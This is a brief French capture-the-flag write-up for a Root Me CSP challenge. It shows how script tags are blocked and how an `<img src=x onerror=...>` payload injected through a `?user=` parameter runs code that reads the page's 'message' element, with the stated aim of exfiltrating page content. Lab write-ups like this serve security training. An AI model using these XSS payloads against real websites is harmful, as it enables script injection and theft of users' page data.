# Challenge root me CSP

## Analyse
    - On s'aperçoit qu'il y a un formulaire de type GET
    - Lorsque l'on essaie d'y mettre du code on est redirigé sur une page qui semble detecter les balises scripts à cause des csp
    - on va donc insérer notre code à l'aide de balise html

## Exploitaiton
> ?user= `<img src=x onerror="code malveillant" />`

On se rend compte que le code fonctionne on peut donc l'exploiter pour y passer du code malveillant

Le but est : `Exfiltrez le contenu de la page !`

### Récupérer le code de la page
> document.body.innerHTML

> plus précie: document.getElementsByClassName("message")[0].innerHTML

### Inclure dans l'url
> `<img src=x onerror='alert(document.getElementsByClassName("message")[0].innerHTML);' >`

